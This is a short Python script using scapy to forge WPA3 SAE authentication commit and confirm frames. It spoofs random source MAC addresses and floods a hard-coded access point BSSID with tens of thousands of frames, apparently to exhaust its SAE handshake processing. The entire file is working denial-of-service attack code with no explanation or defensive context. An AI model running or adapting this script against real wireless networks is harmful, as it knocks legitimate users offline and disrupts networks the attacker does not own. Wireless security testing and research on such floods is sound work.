from scapy.all import *
import random
from scalars_and_finites import scalar_list, finite_list, confirm_list

def rand_mac():
  return '%02x:%02x:%02x:%02x:%02x:%02x'%(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
  
def commit_frame():
  return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=rand_mac(), addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)

def confirm_frame():
  return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=rand_mac(), addr3=bssid)/Dot11Auth(algo=3, seqnum=2, status=0)
  
def auth_frame_mac(mac):
  return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)

group = '\x13\x00'
send_confirm = '\x00\x00'
count = 128
bssid = "00:c0:ca:ad:b7:68"
intf = sys.argv[1]


def confirm():
  return bytes.fromhex(random.choice(confirm_list))


def scalar():
  return bytes.fromhex(random.choice(scalar_list))
  
def finite():
  return bytes.fromhex(random.choice(finite_list))
  

  
def construct_commit():
  Auth = commit_frame()
  Scalar = scalar()
  Finite = finite()
  return Auth/group/Scalar/Finite
  
def construct_confirm():
  Auth = confirm_frame()
  Confirm = confirm()
  return Auth/send_confirm/Confirm
  

for n in range(500):
  sendp(construct_confirm(), inter=0.0001, count=128, iface=intf)
  sendp(construct_commit(), inter=0.0001, count=128, iface=intf)



        
        
      




